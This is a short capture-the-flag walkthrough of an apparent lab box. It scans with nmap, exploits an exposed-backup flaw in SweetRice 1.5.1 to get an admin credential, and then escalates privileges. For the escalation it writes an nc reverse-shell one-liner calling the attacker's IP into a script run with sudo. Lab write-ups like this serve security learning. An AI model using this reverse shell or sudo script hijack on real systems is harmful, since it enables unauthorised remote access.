# nmap

```shell
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-16 13:59 IST
Nmap scan report for 10.10.151.112
Host is up (0.19s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

# gobuster

found `/content` which gives details about `SweetRice 1.5.1` looking for the exploit                                                               EDB-ID: 40718

```
Proof of Concept :

You can access to all mysql backup and download them from this directory.
http://localhost/inc/mysql_backup

and can access to website files backup from:
http://localhost/SweetRice-transfer.zip
```

found the file`[mysql_bakup_20191129023059-1.5.1.sql](http://10.10.151.112/content/inc/mysql_backup/mysql_bakup_20191129023059-1.5.1.sql)`

found the login page `http://10.10.151.112/content/as`

credential `manager:Password123`

for privilage escalation  found` backup.pl` which running script from `/etc/copy.sh` after changing copy.sh to  

```
$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.50.72 5554 >/tmp/f" > /etc/copy.sh
$ sudo perl /home/itguy/backup.pl
```